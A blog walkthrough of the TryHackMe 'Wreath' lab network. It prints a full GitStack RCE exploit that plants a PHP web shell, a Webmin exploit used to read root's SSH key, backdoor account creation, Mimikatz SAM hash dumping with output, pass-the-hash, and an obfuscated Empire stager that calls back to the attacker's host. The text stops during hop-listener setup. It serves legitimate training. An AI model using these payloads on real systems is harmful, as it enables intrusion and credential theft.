---
title: "Navigating the Wreath Network on TryHackMe: A Step-by-Step Guide"
slug: wreath-network
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

*Out of the blue, an old friend from university: Thomas Wreath, calls you after several years of no contact. You spend a few minutes catching up before he reveals the real reason he called:*

> ***"So I heard you got into hacking? That's awesome! I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?"***

*You take a moment to think about it, before deciding to accept the job -- it's for a friend after all.*

*Turning down his offer of payment, you tell him:* ***Challenge Accepted***

---

This is a comprehensive guide to the [Wreath](https://tryhackme.com/room/wreath) Network designed by [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle) on [TryHackMe](https://tryhackme.com). Reading through this will take approximately 30 minutes, and it will take even longer if you follow along while attempting to complete it. I recommend setting aside some time so you can fully appreciate this content, as it has taught me a great deal about enumeration, exploitation, pivoting, command and control, anti-virus evasion, and data exfiltration.

Without further ado, let's get started.

---

## Webserver Enumeration

As with any penetration test, we need to perform a network scan against our target. Our objective is to determine which services are running, and we hope to identify a potential vulnerability in either the service version or a web server operating with weak security controls.

```bash
nmap -sC -sV -Pn -p- wreath.thm --min-rate=1000
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691906881666/85b219cc-8f1c-4fd3-9de2-1ea0401f1bf0.png){: .center-image }

Our nmap scan reveals 5 ports, but only 4 are open.

* `Port 22`: OpenSSH 8.0 \[Open\]
    
* `Port 80`: HTTP - Apache httpd 2.4.37 (CentOS) \[OPEN\]
    

{% include note.html content="This web server tries to redirect to `https://thomaswreath.thm` -- We're going to add this to our `/etc/hosts` lists so we can resolve the address." %}

* `Port 443`: SSL/HTTPS \[OPEN\]
    
* `Port 9090`: zeus-admin \[CLOSED\]
    
* `Port 10000`: MiniServ 1.890 \[OPEN\]
    

Now that we have identified the running services and added the newly discovered domain to our `/etc/hosts` list, let's start enumerating the web server directories using `ffuf`.

### FFUF

Let's start by enumerating `https://wreath.thm` and see what we can discover.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://wreath.thm/FUZZ -fc 302
```

Unfortunately, this does not return anything. The reason is that the webserver redirects users to `https://thomaswreath.thm`. So, with this in mind, let's try enumerating that address instead.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://thomaswreath.thm/FUZZ -fs 15383
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691907397492/49150cc9-471a-4660-957e-09f60461c360.png){: .center-image }

Well, this hasn't proven to be very helpful. We didn't obtain anything useful from this scan. So, let's just head over to `https://thomaswreath.thm` and conduct some manual reconnaissance.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691907505341/c89be8a8-c0b2-4f51-bbc8-86a3e661d3e1.png){: .center-image }

After exploring the website, we discovered a potentially useful phone number: `447821548812`. We'll jot this down and keep it handy in case we can use it for leverage later on.

{% include note.html content="This phone number doesn't prove to be useful; however, it's important to take down as much information as you can gather during a penetration test. There's no such thing as too much intel." %}

### Exploiting CVE-2019-1507

After performing a "`Google-fu`" search using terms related to `MiniServ 1.890` running on `Port 10000`, we discovered an exploit that allows us to achieve Remote Code Execution (RCE) on the server.

We can utilize the "`WebMin 1.890-expired-remote-root`" exploit found in this GitHub repository: [https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE](https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE)

```bash
git clone https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE.git
```

```bash
cd WebMin-1.890-Exploit-unauthorized-RCE
```

```bash
chmod +x webmin-1.890_exploit.py
```

Syntax:

```bash
./webmin-1.890_exploit.py thomaswreath.thm 10000 cat /root/.ssh/id_rsa
```

By executing this exploit on `https://thomaswreath.thm`, we can successfully retrieve the root user's SSH `id_rsa` key, allowing us to establish our initial foothold.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691908242766/75bbd829-62d5-4253-95ad-e3df38e3fef0.png){: .center-image }

From here, we can copy and paste this key into a text file and save it as `id_rsa`. Next, perform the following actions to access the box:

```bash
chmod 600 id_rsa
```

```bash
ssh -i id_rsa root@10.200.105.200
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691908480427/f2302ccb-298a-4807-82bf-658a77e2b17e.png){: .center-image }

As evidence that we have obtained root access to the system, we can display the contents of `/etc/shadow` by using the '`cat`' command:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691908518219/5d9471fc-40ba-416e-8e1b-53fbac1942ad.png){: .center-image }

## Pivoting

Now comes the fun part: performing pivoting to move to another machine and further our access across the network, gradually approaching our primary target - Thomas' PC.

{% include note.html content="I got too excited at this point and failed to capture screenshots of my scan results. Nevertheless, we can essentially perform a simple bash ping and port sweep on the target, which will help us identify the next host to pivot to." %}

Simple Bash Ping Sweep Script:

```bash
for i in {1..255}; do (ping -c 10.200.105.${i} | grep "bytes from" &); done
```

Simple Bash Port Scan Script:

```bash
for i in {1..65535}; do (echo > /dev/tcp/10.200.105.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

In addition to executing these scripts, we can upload a `Netcat` binary to perform the same tasks, potentially achieving better results. From here, we need to upload a static binary, which can be downloaded from this repo: [https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/nmap?raw=true](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true)

Steps to upload the binary to the target (`prod-serv`):

1. Host Python server from our attack box:
    
    ```bash
    python3 -m http.server 8000
    ```
    
2. Create `/tmp` directory.
    
3. Download from the victim box:
    
    ```bash
    curl -L http://<ATTACK_BOX>:8000/nmap --output nmap-reapZ
    ```
    
4. Make it executable:
    
    ```bash
    chmod +x nmap-reapZ
    ```
    

Scan: `./nmap-reapZ -sn 10.200.105.1-255 -oN scan-reapZ` -- `-sn` is used to skip scanning ports and check if hosts are up.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691909626677/dfe8662d-4fc6-429d-b2e7-d2914016f5b5.png){: .center-image }

Scan these two newly discovered hosts: `10.200.105.100` and `10.200.105.150`.

```bash
./nmap-reapZ -p- -Pn 10.200.105.100 --min-rate=1000
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691909681120/f80604c1-3646-459c-a65e-99c1d1568e57.png){: .center-image }

```bash
./nmap-reapZ -p- -Pn 10.200.105.150 --min-rate=1000
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691909697990/55435580-90ef-443c-b5d4-4bff5682aca5.png){: .center-image }

```bash
./nmap-reapZ -T4 -p 1-15000 10.200.105.150
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691909714999/4c388415-9b06-40d3-ab57-1047dc2c32c2.png){: .center-image }

### Pivot to GitServer

At this point, we have gathered enough information to start pivoting to the server hosting the development code for the website. To begin, we will connect to the web service running on IP `10.200.105.150`, which we discovered from the internal nmap scan we recently conducted. We will carry this out by using a proxy tool called `sshuttle`, which essentially creates a tunnel between our attack box and the web service running on the "`.150`" IP address.

Pivot and connect to the service running on `10.200.105.150` using `sshuttle`.

Download `sshuttle`:

```bash
sudo apt install sshuttle
```

Login using the same ssh key:

```bash
sshuttle -r root@10.200.105.200 --ssh-cmd "ssh -i id_rsa" -N &; ps
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691909697990/55435580-90ef-443c-b5d4-4bff5682aca5.png){: .center-image }

Service on `10.200.105.150` is gitstack.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691910298023/cc675a81-7191-43f7-be2f-4d264ed2934b.png){: .center-image }

Going to [`http://10.200.105.150/gitstack`](http://10.200.105.150/gitstack) brings us to a login panel. The default credentials `admin:admin` does not work.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691910317669/a2d6f6be-4e44-44cf-b689-18b59dfbc3b2.png){: .center-image }

Looking for `gitstack` on `searchsploit` reveals an RCE for this service:

```bash
searchsploit gitstack
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691910333574/44c794a6-94c0-4220-b954-c4e79b469391.png){: .center-image }

Download it:

```bash
searchsploit -m php/webapps/43777.py
```

### GitStack (2.3.10) RCE - Code Review

Before reviewing the code, convert the DOS line endings to Linux line endings using either `dos2unix ./43777.py` or `sed -i 's/\r//' ./43777.py`.

43777.py (GitStack Exploit) Code:

```python
#!/usr/bin/python2

# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 18.01.2018
# Software Link: https://gitstack.com/
# Exploit Author: Kacper Szurek
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: remote
#
#1. Description
#
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
#
#2. Proof of Concept
#
import requests
from requests.auth import HTTPBasicAuth
import os
import sys

ip = '10.200.105.150'

# What command you want to execute
command = "hostname"

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

print "[+] Get user list"
try:
    r = requests.get("http://{}/rest/user/".format(ip))
    user_list = r.json()
    user_list.remove('everyone')
except:
    pass

if len(user_list) > 0:
    username = user_list[0]
    print "[+] Found user {}".format(username)
else:
    r = requests.post("http://{}/rest/user/".format(ip), data={'username' : username, 'password' : password})
    print "[+] Create user"

    if not "User created" in r.text and not "User already exist" in r.text:
        print "[-] Cannot create user"
        os._exit(0)

r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
    print "[+] Web repository already enabled"
else:
    print "[+] Enable web repository"
    r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
    if not "Web interface successfully enabled" in r.text:
        print "[-] Cannot enable web interface"
        os._exit(0)

print "[+] Get repositories list"
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
    repository = repository_list[0]['name']
    print "[+] Found repository {}".format(repository)
else:
    print "[+] Create repository"

    r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
    if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
        print "[-] Cannot create repository"
        os._exit(0)

print "[+] Add user to repository"
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
    print "[-] Cannot add user to repository"
    os._exit(0)

print "[+] Disable access for anyone"
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
    print "[-] Cannot remove access for anyone"
    os._exit(0)

print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit-reapZ.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit-reapZ.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')
```

This code is relatively self-explanatory. We only need to focus on this part:

```python
ip = '10.200.105.150'

# What command you want to execute
command = "hostname"
```

This text specifies the target IP address and the command to be executed on the web server. Once this part is completed, we can begin exploiting the target server.

### Exploiting GitServer

With our variables initialized, we can exploit our target `http://10.200.105.150`.

{% include note.html content='Ensure that sshuttle is connected. If the connection has been lost, reestablish it by entering the following command: <br>`sshuttle -r root@10.200.105.200 --ssh-cmd "ssh -i id_rsa" -N &; ps`' %}

Exploit:

```bash
./43777.py
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691911934313/8b000c38-8305-4ed6-96cd-bd9781e9ed9f.png){: .center-image }

Access the shell using:

```bash
curl -X POST http://10.200.105.150/web/exploit-reapZ.php -d "a=whoami"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691911939307/90c108d2-a885-4342-a4f3-35bffb13469e.png){: .center-image }

To simplify this process, we can now go to [`http://10.200.105.150/web/exploit-reapZ.php`](http://10.200.105.150/web/exploit-reapZ.php) and intercept this request with `Burp Suite`.

1. Enable `FoxyProxy`
    
2. Start BurpSuite and turn `Intercept` on.
    
3. Refresh the page and catch the request.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691911999140/295e84a3-74e7-412a-ab8e-b87dece3c6c9.png){: .center-image }
    
4. Change the request method to `POST`.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912002322/0bff7562-b43b-4ecc-8f67-c9c65b21544c.png){: .center-image }
    
5. Add the command variable: `a=whoami` and send to `repeater`.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912019261/31b37810-825c-4f89-81dc-1c6d6f150f92.png){: .center-image }
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912021809/f605f605-97f7-4a6c-8210-a5ec273b793d.png){: .center-image }
    
6. Click `Send` to see the response.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912076794/8ba264b8-2c94-4350-9a74-519b65996ecd.png){: .center-image }
    
7. We can grab the operating system details by typing `systeminfo`.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912073697/c964d355-1cd4-4aef-b0f1-adf874941883.png){: .center-image }
    

### Can This Server Communicate Externally?

To ensure a reverse shell successfully connects back to our listener, we must verify if the server can communicate externally. This can be achieved by executing `tcpdump` on our attacking machine and initiating a ping from the `GitServer`.

```bash
tcpdump -i tun0 icmp
```

Change the command in Burp Suite to `ping -n 3 <ATTACKBOX IP>`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912601113/8830f8b0-3fa0-427a-8cb9-ea9b5bb285d6.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912604527/76d3d513-47b4-4d39-85f1-96c433b34a1c.png){: .center-image }

Based on these results, the server is unable to communicate externally.

### Capture the Shell

First, we need to open a port on the target box. The reason for this is that `CentOS` employs a feature called an `always-on wrapper` around its `IPTables` firewall. This means the firewall will block anything other than SSH and specific services allowed by the system `Administrator`. We can modify the permitted ports and enable a reverse shell to connect to our attack box by using this command:

```bash
firewall-cmd --zone=public --add-port 15741/tcp
```

This command enables all inbound connections to the specified port, `15741`, and designates the protocol as TCP.

We can open this port directly within the SSH session we have on `prod-serv`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912775923/9fa42c72-c8b7-42f4-8ae9-3389427d6f19.png){: .center-image }

From here, we want to upload a `Netcat` binary, which will allow us to create a listener and capture the reverse shell from the `git-serv` machine.

Make sure the `Python HTTP Server` is running, and enter the following command in the `prod-serv` terminal:

```bash
curl -L http://<ATTACK_BOX>:8000/nc --output ./nc-reapZ
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912875632/74b05d58-9d7d-43f2-823f-72d2220987b8.png){: .center-image }

Make it executable:

```bash
chmod +x nc-reapZ
```

Now, initiate a listener and intercept the reverse shell transmitted through `Burp Suite`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912883561/7f321352-ded9-47dc-a377-71b813d592df.png){: .center-image }

Encode the payload URL by highlighting the code and pressing `CTRL+U`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912914302/0f9ac2a6-241e-433c-ae1b-baf381e8c0c6.png){: .center-image }

Send the command, and the listener should intercept the shell, granting us access to the Windows `git-serv` machine.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691912986209/e9b11236-8ec4-4042-ba04-189fa847d8e9.png){: .center-image }

### Stabilization and Post Exploitation

First, we need to create an account for ourselves:

```bash
net user reapZ password /add
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691913263961/df5b32da-3d5a-4c9e-837f-2f5c108162b7.png){: .center-image }

Then, we want to add our account to the `Administrators` and `Remote Management Users` groups:

```bash
net localgroup Administrators reapZ /add
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691913281622/929595a5-7090-4bdb-aeb2-f41105e3a199.png){: .center-image }

```bash
net localgroup "Remote Management Users" reapZ /add
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691913311198/57609b83-20f6-4542-b463-34cf752c05c5.png){: .center-image }

Verify that the account has been correctly set up by typing:

```bash
net user reapZ
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691913322279/4851de71-055b-4d0b-8d54-e07706ea3a56.png){: .center-image }

The account is now set up and ready for us to use, ensuring stable access when logging in. Let's proceed to log in using `Evil-WinRM`.

Install:

```bash
sudo gem install evil-winrm
```

```bash
evil-winrm -u reapZ -p password -i 10.200.105.150
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691913848646/89f71d84-177b-4cda-af71-936abcf0a1ff.png){: .center-image }

Let's also set up a GUI RDP using `xfreerdp`.

Install:

```bash
sudo apt install freerdp2-x11
```

```bash
xfreerdp /v:10.200.105.150 /u:reapZ /p:password +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

1. `v` = host
    
2. `u` = username
    
3. `p` = password
    
4. `+clipboard` = enables clipboard support
    
5. `dynamic-resolution` = makes it possible to resize the window with the respective resolution
    
6. `/drive:/usr/share/windows-resources,share` = creates a shared drive between our attack box and the target
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691914012051/704fbc66-1c90-4726-8bd0-33a5e9072db3.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691914014787/84b08a56-77b0-4211-b336-efa579f448d2.png){: .center-image }

Now, we can utilize `Mimikatz` to extract the local account password hashes from the `git-serv` machine. Let's launch PowerShell as an `Administrator`.

Run the following command to start `Mimikatz`:

```bash
\\tsclient\share\mimikatz\x64\mimikatz.exe
```

{% include note.html content="If you chose a different name for your share then make sure to change it above." %}

Next, we aim to grant ourselves `Debug Privileges` and elevate our integrity level to `SYSTEM`.

```bash
privilege::debug
```

```bash
token::elevate
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691914149941/5e94f7bf-4f7f-4afa-a3a8-1bd44c9435ad.png){: .center-image }

Now dump all the `SAM` local password hashes:

```bash
lsadump::sam
```

```plaintext
mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 68b1608793104cca229de9f1dfb6fbae

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-1696O63F791Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
      des_cbc_md5       (4096) : e3915234101c6b75

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-1696O63F791Administrator
    Credentials
      des_cbc_md5       : e3915234101c6b75


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e389f51da73551518c3c2096c0720233

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
      des_cbc_md5       (4096) : b6f1bac2346d9e2c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : b6f1bac2346d9e2c


RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: [REDACTED]

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03126107c740a83797806c207553cef7

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVThomas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
      des_cbc_md5       (4096) : e5add55e76751fbc
    OldCredentials
      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
      des_cbc_md5       (4096) : 7f16a47cef890b3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVThomas
    Credentials
      des_cbc_md5       : e5add55e76751fbc
    OldCredentials
      des_cbc_md5       : 7f16a47cef890b3b


RID  : 000003ea (1002)
User : reapZ
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d4251486b0c24a7e69c63c36a5a824f9

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVreapZ
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c7af09e3f5441bca9e1b43f604233000b41c1772f565a15eee442035119a9bd2
      aes128_hmac       (4096) : 2750cf795dbeee3199befd2718f34b91
      des_cbc_md5       (4096) : 6b8f61e038377991

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVreapZ
    Credentials
      des_cbc_md5       : 6b8f61e038377991
```

Let's obtain the `NTLM hash` for Thomas and practice decrypting it using [CrackStation](http://crackstation.net).

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691914322457/6f859c6d-fc91-44f1-ab46-324843179abd.jpeg){: .center-image }

From here, we need to carry out a `pass-the-hash attack` using the `Administrator` hash obtained from `Mimikatz`. To do this, we must copy the hash and execute it on our attack box.

```bash
evil-winrm -u Administrator -H <NTLM_HASH> -i 10.200.105.150
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691914365689/6ec0f0b6-2238-4ac4-b3af-a99feab57102.jpeg){: .center-image }

## Setting Up Empire (C2)

Now that we've gained a foothold, let's establish our command and control server to efficiently manage our agents. We will be using a combination of `Empire` and `Starkiller` to accomplish this task. For the majority of the walkthrough in this part, we will be utilizing the CLI, as it's easier for me to manage.

Install:

```bash
sudo apt install powershell-empire starkiller
```

Start `Empire` server:

```bash
sudo powershell-empire server
```

Initialize `Empire` client:

```bash
powershell-empire client
```

Login to the `Starkiller` panel with default credentials: `empireadmin:password123`

```bash
http://localhost:1337/index.html
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691954521743/863ceb72-1fce-4fda-8bd3-158870230b6b.png){: .center-image }

Main page:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691954544713/95eecb8f-a27b-441b-b53e-84f53debae63.png){: .center-image }

### Create the Listener

We need to choose a listener to establish a connection with our stagers. From the client CLI, type:

```bash
uselistener http
```

```bash
set Name CLIHTTP
```

```bash
set Host 10.50.106.231
```

```bash
set Port 8000
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691954663794/47248fc1-acaa-47c1-bbb7-4f947af151ea.png){: .center-image }

```bash
execute
```

Verify that it is running by entering:

```bash
listeners
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691954694711/94a6e812-cb14-4447-b1b5-81dff45d717e.png){: .center-image }

Excellent, it's running. We can also observe it being displayed in `Starkiller`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691954712363/4022dc99-9f48-4b6b-a128-56a27d50c66a.png){: .center-image }

### Create the Stager

Stagers are utilized to establish a connection back to our listener, creating an `Agent` upon execution.

Display available `usestager` options:

```bash
usestager
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691954915666/63a91f90-3772-46a3-bda6-b5fc52b7bbf7.png){: .center-image }

Select `multi/bash`:

```bash
usestager multi/bash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691954924785/6b99f36a-3ae0-4aa9-a17e-c6874b2339bd.png){: .center-image }

Set the listener to the one we previously defined: `CLIHTTP`

```bash
set Listener CLIHTTP
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691955004896/f05f5931-7603-4ebb-b9ca-b29d8858224e.png){: .center-image }

```bash
execute
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691955015442/d160ab7b-aa26-42fc-b75a-a4d5e0832187.png){: .center-image }

Once more, we can verify that our stager has been configured in `Starkiller`:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691955032195/4861ec02-c063-48e4-bc95-29d7f6e75a53.png){: .center-image }

For now, we will copy the payload and save it as `stager.sh` for future use.

### Initializing Our Agent

It's time to initialize our `Agent`. We will start by copying our payload to the `prod-serv`.

{% include note.html content="If your SSH connection dropped, connect back using: `ssh -i id_rsa root@10.200.105.200`" %}

Copy, paste, and execute the `stager.sh` payload:

```bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMC41MC4xMDYuMjMxOjgwMDAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7CnJlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHNlcnZlcit0KTsKcHJveHkgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSk7Cm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JyxVQSksICgiQ29va2llIiwgInNlc3Npb249NGlMN3pzVDFGRkdldXoySnhaZUc4MzJTTUZVPSIpXTsKdXJsbGliLnJlcXVlc3QuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdOwpkYXRhPWFbNDpdOwprZXk9SVYrJztGVDI2cG4sP2omLnY4fkpzcm8oS2hBQl9ILzo8LTliJy5lbmNvZGUoJ1VURi04Jyk7ClMsaixvdXQ9bGlzdChyYW5nZSgyNTYpKSwwLFtdOwpmb3IgaSBpbiBsaXN0KHJhbmdlKDI1NikpOgogICAgaj0oaitTW2ldK2tleVtpJWxlbihrZXkpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKaT1qPTA7CmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NjsKICAgIGo9KGorU1tpXSklMjU2OwogICAgU1tpXSxTW2pdPVNbal0sU1tpXTsKICAgIG91dC5hcHBlbmQoY2hyKGNoYXJeU1soU1tpXStTW2pdKSUyNTZdKSk7CmV4ZWMoJycuam9pbihvdXQpKTs='));" | python3 &
```

Ensure that either `Empire` or `Starkiller` has received the callback.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691955389560/ce1a31e2-59f8-40e9-a284-bf5944c32398.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691955417093/184eb7bb-cbb2-4573-bbf7-26703133697b.png){: .center-image }

Let's engage with the `Agent` by typing:

```bash
interact LQO71Q2O
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691955452865/a231f540-da98-4dfd-b92c-888c79362a48.png){: .center-image }

Run `whoami` to see who we are:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691955485390/fb6fbd7e-7cf9-489b-b6bc-8c9eb5afaafc.png){: .center-image }

We will terminate our agent for now and revisit it later.

```bash
kill LQO71Q2O
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691955581303/eb6ef515-8ba8-4d6b-a47d-4e37e94e758f.png){: .center-image }

### Setup a Callback from GitServer

So, we need to figure out a way to get the GitServer hosting the development site to call back to us. Unfortunately, the server doesn't communicate externally, so we can't easily just throw a `netcat` binary at it and connect it back to our attack box. We'll need to connect to it via a proxy, which is where a Hop Listener comes into play.

Hop Listeners are essential when an agent cannot call back under normal circumstances. By using this type of listener, we essentially create files to be transferred to our compromised `jump server` and hosted from there. These are `.php` files containing instructions to call back to our `HTTP` listener, eliminating the need to open a port on the compromised machine.

Start listener in `Empire`:

```bash
uselistener http_hop
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956262551/8c34899e-745e-4cfd-ae8f-63bfb6d7f0ac.png){: .center-image }

Set `RedirectListener` to our previously defined Listener:

```bash
set RedirectListener CLIHTTP
```

Set `Host` to `git-prod` webserver:

```bash
set Host 10.200.105.200
```

Set `Port`:

```bash
set Port 47000
```

Verify it's set:

